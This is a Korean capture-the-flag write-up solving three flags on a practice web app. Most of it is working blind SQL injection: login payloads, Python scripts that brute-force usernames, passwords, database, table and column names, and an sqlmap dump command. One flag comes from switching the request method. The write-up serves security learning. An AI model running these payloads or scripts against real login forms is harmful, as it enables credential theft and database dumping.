# # 0 Flag

Create a new page 버튼을 누르면 로그인 화면이 나온다.

username에 싱글쿼터를 넣어보니 아래 사진 처럼 에러가 뜨는 것을 볼 수 있다. 에러를 자세히 보면 로그인 쿼리가 자세히 출력 되는 것을 볼 수 있다.
얻을 수 있는 정보는 Table 이름과 Column 이름이다. 

![image](https://user-images.githubusercontent.com/38517436/64118999-c8131c80-cdd3-11e9-8806-88b8c828638e.png)


일단 sql injection 공격이 된다는 것을 알게 되었다. 공격 시나리오를 위해 username에

```
' or 1=1# 
```
이라는 값을 주었더니 Invalid password 라는 문구가 출력되었다. username에 아무런 값을 던져주니 unknown username 이라고 출력이 된다.
따라서 query 문이 참이면 Invalid password, query 문이 거짓이면 unknown username 이라는 값을 주니 blind sqli 공격이 가능하다.

우선 어떤 계정으로 로그인 하기 위해 username과 password를 알아내야 한다. 우리는 에러 부분으로 Column 이름을 알고 있기 때문에 다음과 같은 공격이 가능하다.

### Get username and password

  username의 길이는 뭔지 모르기 때문에 
  ```
  ' or length(username)=1#
  ```
  라고 입력하고 참(Invalid password)이 뜰때 까지 =1, =2, =3 ... 값을 늘려간다.
  
  ![image](https://user-images.githubusercontent.com/38517436/64119541-12e16400-cdd5-11e9-8ae6-bb507cd2e988.png)
  
  위 query 값을 보냈을때 username length 는 5인 것을 알 수 있다.
  
  똑같은 방법으로 password length를 알아본 결과 5인 것을 알 수 있었다.
  
  ![image](https://user-images.githubusercontent.com/38517436/64119666-55a33c00-cdd5-11e9-9492-16428c02f6d2.png)
  
  username과 password의 lenght를 알아냈으니 column 에 들어있는 데이터를 가져와 보자.
  ```
  ' or substr(username,1,1) = 'a'#
  ```
  다음과 같은 query로 username의 값을 하나씩 알 수 있게 된다.
  
  이러한 과정을 python code로 구현해 보았다.
  
  ```python
  import requests
  import string

  url = 'http://35.190.155.168/87ece3af89/login'
  result = ''
  chars = string.ascii_lowercase + string.punctuation + string.digits
  # 0 Flag kalyn:jesse

  ### Get username

  for count in range(1,6):
    for char in chars:
      payload = "' or substr(username,{},1) = '{}'#".format(count, char)
      data = {'username' : payload, 'password' : '1'}

      res = requests.post(url, data = data)
      print(payload)

      if res.text.find('Invalid password') != -1:
        result = result + char
        print(result)
        break


  ### Get passowrd

  for count in range(1,6):
    for char in chars:
      payload = "' or substr(password,{},1) = '{}'#".format(count, char)
      data = {'username' : payload, 'password' : '1'}

      res = requests.post(url, data = data)
      print(payload)

      if res.text.find('Invalid password') != -1:
        result = result + char
        print(result)
        break

  ```
  
  위 결과로 username : password 값은 kalyn : jesse 인 것을 알 수 있었다.
  로그인 해보니 아래와 같이 Flag 값을 얻을 수 있었다.
  
  ![image](https://user-images.githubusercontent.com/38517436/64120075-41137380-cdd6-11e9-9a19-33b882c76a76.png)

  



# # 1 Flag
  위 sqli 공격에서 username과 password 뿐만 아니라 db 유출도 가능한지 테스트를 해보았다. 몇번의 수동으로 테스트를 해본 결과 DB의 개수가 4개 인 것을 
  알 수 있었다. 그래서 DB의 이름을 가져오기 위해 python code를 작성했다.
  
  ### Get DB name (python code)
  ```python
  # File name: Get_DB_name.py
  # This script gets DB name
  #
  # db list is 'information_schema', 'level2', 'mysql', 'performance_schema'

  import requests
  import string

  chars = string.ascii_lowercase + string.punctuation + string.digits 

  url = 'http://35.190.155.168/87ece3af89/login'
  dbname = list()
  tmp = ''
  dbCount = 0

  def sendPayload(payload):
    data = {'username' : payload, 'password' : '1'}
    res = requests.post(url, data = data)
    print(payload)

    return res.text

  ####################
  ### Get db count ###
  ####################
  for i in range(0,10):
    payload = "' or (select count(distinct(table_schema)) from information_schema.columns) = {}#".format(i)

    if sendPayload(payload).find('Invalid password') != -1:
      dbCount = i
      print("[*] DB count is {}".format(dbCount))
      break

  #######################	
  ### Get all db name ###
  #######################
  dbcount = 0
  while dbcount<dbCount:
    dbnameLen = 0

    ########################
    # Get db name's length #
    ########################
    for length in range(0,30):
      payload = "' or length((select distinct(table_schema) from information_schema.columns limit {},1)) = {} #".format(dbcount, length)

      if sendPayload(payload).find('Invalid password') != -1:
        dbnameLen = length
        print("[*] {} db name length is {}".format(dbcount, length))
        break

    for i in range(1, dbnameLen+1):
      for char in chars:
        payload = "' or substr((select distinct(table_schema) from information_schema.columns limit {},1),{},1) = '{}'#".format(dbcount, i, char)

        if sendPayload(payload).find('Invalid password') != -1:
          tmp += char
          print(tmp)
          break
    dbname.append(tmp)
    tmp = ''
    dbcount += 1

  print(dbname)


  ```



   위 python script 를 돌려본 결과 level2라는 DB 존재를 알게 되었고, level2가 가지고 있는 table name을 알아내기 위해 킹갓 python code를 작성했다.

   ### Get table name (python code)
   
   ```python
    # File name: Get_table_name.py
    # This script gets table name in DB
    #
    #
    # Result table name ['admins', 'pages']

    import requests
    import string

    db_list = 'level2' # Real db list is 'information_schema', 'level2', 'mysql', 'performance_schema'
    chars = string.ascii_lowercase + string.punctuation + string.digits
    url = 'http://35.190.155.168/87ece3af89/login'

    tableCount = 0
    tmp = ''
    result_table_name = list()

    def sendPayload(payload):
      data = {'username' : payload, 'password' : '1'}
      res = requests.post(url, data = data)
      print(payload)

      return res.text


    ###############
    # Count table #
    ###############
    for i in range(0,30):
        payload = "' or (SELECT COUNT(DISTINCT(table_name)) FROM information_schema.columns WHERE table_schema = '{}') = {}#".format(db_list, i)

        if sendPayload(payload).find("Invalid password") != -1:
            tableCount = i
            print("[*] Table count is {}".format(tableCount))
            break


    ##################
    # Get table name #
    ##################
    tablecount = 0

    while tablecount < tableCount:
        tablenameLen = 0

        # Get table name length
        for i in range(0,40):
            payload = "' or length((SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema = '{}' LIMIT {},1)) = {} #".format(db_list, tablecount, i)

            if sendPayload(payload).find("Invalid password") != -1:
                tablenameLen = i
                print("[*] Table name length is {}".format(tablenameLen))
                break

        for i in range(1, tablenameLen+1):
            for char in chars:
                payload = "' or SUBSTR((SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema = '{}' LIMIT {},1),{},1) = '{}' #".format(db_list, tablecount, i, char)

                if sendPayload(payload).find("Invalid password") != -1:
                    tmp += char
                    print(tmp)
                    break

        result_table_name.append(tmp)
        tmp = ''
        tablecount += 1

    print(result_table_name)
   ```
   
   level2 DB에 admins와 pages라는 2개의 table 이 존재하는 것을 알 수 있었다. 이제 각각의 table에 몇개의 column 을 가지고 있는지 킹갓 python code로
   binary search 알고리즘으로 코드를 작성해보았다.
   
   ```python
    # File name: Get_column_count.py
    # This script gets columns name in table
    #

    import requests
    import string
    from random import *


    def sendPayload(payload):
      data = {'username' : payload, 'password' : '1'}
      res = requests.post(url, data = data)
      print(payload)

      return res.text

    char = string.ascii_lowercase + string.digits + string.punctuation
    url = 'http://35.190.155.168/87ece3af89/login'

    db_list = 'level2'
    table_list = ['admins', 'pages']
    count = range(0,100)
    compareLetter = ['<', '>']
    columnCount = 0

    #############################
    # Get column count in table #
    #############################
    for tableName in table_list:
        tmp = count

        # Get columns count
        while True:
            compare = compareLetter[randint(0, 1)]

            payload = "' or (SELECT COUNT(DISTINCT(column_name)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name = '{}') {} {}#".format(db_list, tableName, compare, tmp[int(len(tmp)/2)])

            if sendPayload(payload).find("Invalid password") != -1:
                if compare == "<":
                    tmp = tmp[:int(len(tmp)/2)+1]
                else:
                    tmp = tmp[int(len(tmp)/2):]

            else:
                if compare == "<":
                    tmp = tmp[int(len(tmp)/2):]
                else:
                    tmp = tmp[:int(len(tmp)/2)+1]

            if len(tmp) <= 2:
                payload = "' or (SELECT COUNT(DISTINCT(column_name)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name = '{}') = {}#".format(db_list, tableName, tmp[0])

                if sendPayload(payload).find("Invalid password") != -1:
                    columnCount = tmp[0]
                else:
                    columnCount = tmp[1]
                print("[*] {}'s column count is {}. ".format(db_list, columnCount))
                break
   ```
   
   
   admins의 column 개수는 3개, pages의 column의 개수는 4개 인 것을 알 수 있었다.
   
   여기서 귀첞아서... 그냥 sqlmap을 돌렸다... (이 정도 코딩했으면 tool 돌릴만 하잖아!!)
   
   ```
   sqlmap -u http://35.190.155.168/87ece3af89/login --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T pages --dbms mysql --regexp "invalid password" --level 2
   ```
   
   위와 같은 명령어로 sqlmap을 돌려본 결과 Flag 데이터가 있었다.
   
   ```
   My secret is ^FLAG^1f6d49309f52f2dd44924c96dede83183e6818dbb9ca78fb091ab948247a5e37$FLAG$
   ```
   


# # 2 Flag
  이 flag는 몰라서 찾아봤는데 게시글을 수정할때 아래와 같은 url로 GET 방식으로 요청하는 것을 볼 수 있다.
  
  ![image](https://user-images.githubusercontent.com/38517436/64121187-0f4fdc00-cdd9-11e9-93a9-04e8453e5219.png)

  이 문제는 만약 GET이 아니라 다른 method로 요청이 들어왔을 경우, 그에 따른 개발자가 예상치 못한 응답을 보낼 수 도 있다는 것을 알려주는 문제인듯 하다.
  
  그래서 GET 말고 POST 방식으로 요청을 보내면 다음과 같이 Flag를 얻을 수 있다.
  
  ![image](https://user-images.githubusercontent.com/38517436/64121346-88e7ca00-cdd9-11e9-9d2c-9f678d66526d.png)


